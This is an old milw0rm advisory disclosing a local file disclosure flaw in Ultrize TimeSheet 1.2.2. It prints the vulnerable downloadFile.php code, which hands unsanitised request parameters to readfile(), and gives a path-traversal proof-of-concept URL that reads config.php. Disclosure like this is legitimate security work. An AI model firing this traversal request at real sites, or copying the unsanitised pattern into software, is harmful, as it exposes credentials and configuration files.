<html><head><title>Ultrize TimeSheet 1.2.2 readfile() Local File Disclosure Vulnerability</title></head><pre>Ultrize TimeSheet 1.2.2 readfile() Local File Disclosure Vulnerability
Code page  /actions/downloadFile.php

====
&lt;?php
//** This script performs the actual file download

$fileName = $_REQUEST['fileName']; &lt;--!!
$job_id = $_REQUEST['job_id']; &lt;--!!
$fullFile = $config['upload_dir'].$job_id.'/'.$fileName; &lt;--!!

if (file_exists($fullFile))
{
    header(&quot;Content-Type: application/octet-stream&quot;);
    header(&quot;Content-Length: &quot;.filesize($fullFile));

    header('Content-Disposition: attachment; fileName=&quot;'.$fileName.'&quot;');

    readfile($fullFile); &lt;--!!
}
else
{
    header(&quot;HTTP/1.0 404 Not Found&quot;);
    print &quot;&lt;h1&gt;File not found. &lt;/h1&gt;&quot;;
    print $fileName;
    print &quot;&lt;hr&gt;Please make sure your file paths are correct: {$config['upload_dir']}/{$job_id}/$fileName}&lt;br /&gt;&quot;;
}

?&gt;
====

Poc
/actions/downloadFile.php?fileName=../config.php

          .___________..______     ____    ____  ___       _______   
           |           ||   _  \    \   \  /   / /   \     /  _____|  
           `---|  |----`|  |_)  |    \   \/   / /  ^  \   |  |  __    
               |  |     |      /      \_    _/ /  /_\  \  |  | |_ |   
               |  |     |  |\  \----.   |  |  /  _____  \ |  |__| |   
               |__|     | _| `._____|   |__| /__/     \__\ \______|   
                                                             
       ___       ______     ___       _______   _______ .___  ___. ____    ____   
      /   \     /      |   /   \     |       \ |   ____||   \/   | \   \  /   /   
     /  ^  \   |  ,----'  /  ^  \    |  .--.  ||  |__   |  \  /  |  \   \/   /    
    /  /_\  \  |  |      /  /_\  \   |  |  |  ||   __|  |  |\/|  |   \_    _/     
   /  _____  \ |  `----./  _____  \  |  '--'  ||  |____ |  |  |  |     |  |       
  /__/     \__\ \______/__/     \__\ |_______/ |_______||__|  |__|     |__|  

# milw0rm.com [2009-07-30]</pre></html>